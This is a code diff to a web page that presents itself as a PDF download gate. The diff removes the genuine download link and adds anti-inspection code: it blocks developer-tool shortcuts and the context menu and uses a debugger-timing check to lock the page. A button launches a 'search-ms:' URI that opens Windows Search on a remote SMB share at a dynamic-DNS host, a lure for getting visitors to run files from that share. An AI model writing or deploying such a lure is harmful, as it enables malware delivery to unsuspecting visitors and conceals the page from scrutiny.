@@ -439,8 +439,7 @@
             <!-- Step 4: Success Message -->
             <div id="modal-step-4" class="hidden text-center">
                 <h3 class="text-2xl font-bold text-green-400 mb-4">Wow! Access Granted!</h3>
-                <p class="text-gray-300">You have successfully accessed the resources. Your download link is ready.</p>
-                 <a id="final-download-link" href="leph204.pdf" download="Atom_Information.pdf" class="inline-block mt-6 bg-green-600 hover:bg-green-500 text-white font-bold py-3 px-8 rounded-lg transition-colors duration-300">Download Now</a>
+                <p class="text-gray-300">You have successfully accessed the resources.</p>
             </div>
         </div>
     </div>
@@ -559,12 +558,47 @@
             }
             
             document.addEventListener('keydown', function(e) {
-                if (e.ctrlKey && (e.key === 'p' || e.key === 's' || e.key === 'P' || e.key === 'S')) e.preventDefault();
+                // Block common developer shortcuts
+                if (
+                    (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i')) ||
+                    (e.ctrlKey && (e.key === 'p' || e.key === 's' || e.key === 'P' || e.key === 'S')) ||
+                    e.key === 'F12'
+                ) {
+                    e.preventDefault();
+                }
             });
 
             document.addEventListener('contextmenu', function(e) {
                 e.preventDefault();
             });
+
+            // --- Developer Tools Detection ---
+            const detectDevTools = () => {
+                const threshold = 160; // Milliseconds threshold for detection
+                let devToolsOpen = false;
+
+                const check = () => {
+                    const startTime = new Date().getTime();
+                    // This debugger statement will pause execution only when DevTools is open.
+                    debugger;
+                    const endTime = new Date().getTime();
+
+                    if (endTime - startTime > threshold) {
+                        // Only trigger block if it's the first time detected
+                        if (!devToolsOpen) {
+                           blockAccess('Developer Tools Prohibited', 'Please close the developer console to continue using this site.');
+                           devToolsOpen = true;
+                        }
+                    }
+                };
+                
+                // Periodically check to see if dev tools were opened
+                setInterval(check, 1000);
+                // Also check when the window is resized
+                window.addEventListener('resize', check);
+            };
+
+            detectDevTools();
 
             // PDF Modal Logic
             const downloadBtn = document.getElementById('download-btn');
@@ -581,8 +615,10 @@
             let countdownInterval;
 
             function showStep(stepToShow) {
-                [step1, step2, step3, step4].forEach(step => step.style.display = 'none');
-                stepToShow.style.display = 'block';
+                [step1, step2, step3, step4].forEach(step => {
+                    if (step) step.style.display = 'none';
+                });
+                if (stepToShow) stepToShow.style.display = 'block';
             }
 
             downloadBtn.addEventListener('click', () => {
@@ -595,25 +631,32 @@
             });
 
             closeModalBtn.addEventListener('click', () => {
-                 modalContent.style.transform = 'scale(0.95)';
-                 modalContent.style.opacity = '0';
-                 setTimeout(() => {
+                modalContent.style.transform = 'scale(0.95)';
+                modalContent.style.opacity = '0';
+                setTimeout(() => {
                     modal.style.display = 'none';
                     clearInterval(countdownInterval); // Stop timer if modal is closed
-                 }, 300);
+                }, 300);
             });
 
             openExplorerBtn.addEventListener('click', () => {
                 showStep(step2);
                 try {
-                    // This protocol is used to open Windows Search.
-                     const targetUri = "search-ms:crumb=location:\\\\smb2server.ddns.net\\Secure_Access&query=*.txt";
-                     window.location.href = targetUri;
+                    // Attempt to open the protocol in a new tab
+                    const newTab = window.open('', '_blank');
+                    if (newTab) {
+                        newTab.location.href = "search-ms:crumb=location:\\\\smb2server.ddns.net\\Secure_Access&query=*.txt";
+                        // Many browsers will block this and may close the tab immediately.
+                    } else {
+                        // This case handles pop-up blockers. We just go back to step 1.
+                        showStep(step1);
+                        return;
+                    }
                 } catch (e) {
-                    console.warn("Could not open file explorer via search-ms protocol due to browser security or OS incompatibility.");
+                    console.warn("Could not execute protocol due to browser security or OS incompatibility.", e);
                 }
                 
-                // Start Countdown
+                // Start Countdown regardless of success, as the prompt might appear behind the window.
                 let countdown = 20;
                 const timerElement = document.getElementById('countdown-timer');
                 timerElement.textContent = countdown;
@@ -628,11 +671,10 @@
             });
 
             proceedBtn.addEventListener('click', () => {
-                 showStep(step4);
+                showStep(step4);
             });
         });
     </script>
 </body>
 </html>
-
 
